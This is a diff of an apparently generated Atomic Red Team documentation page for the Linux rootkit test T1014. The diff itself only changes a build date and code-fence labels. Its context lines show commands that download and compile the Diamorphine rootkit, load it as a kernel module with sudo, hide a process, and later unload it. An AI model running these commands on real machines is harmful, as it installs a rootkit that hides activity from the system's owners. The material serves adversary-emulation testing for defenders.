@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1014"
 attack_technique_name: "Rootkit"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1014/T1014.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "sh"
 aliases:
   - "0b996469-48c6-46e2-8155-a17f8b6c2247"
@@ -64,13 +64,13 @@ The kernel module must exist on disk at specified location (#{rootkit_name}.ko)
 
 ### Prerequisite Check
 
-```text
+```bash
 if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 mkdir -p /tmp/atomic && cd /tmp/atomic
 curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}
 make
@@ -85,7 +85,7 @@ sudo depmod -a
 
 ### Command
 
-```sh
+```bash
 sudo modprobe #{rootkit_name}
 ping -c 10 localhost >/dev/null & TARGETPID="$!"
 ps $TARGETPID
@@ -95,7 +95,7 @@ ps $TARGETPID || echo "process ${TARGETPID} hidden"
 
 ### Cleanup
 
-```sh
+```bash
 kill -63 1
 sudo modprobe -r #{rootkit_name}
 sudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic
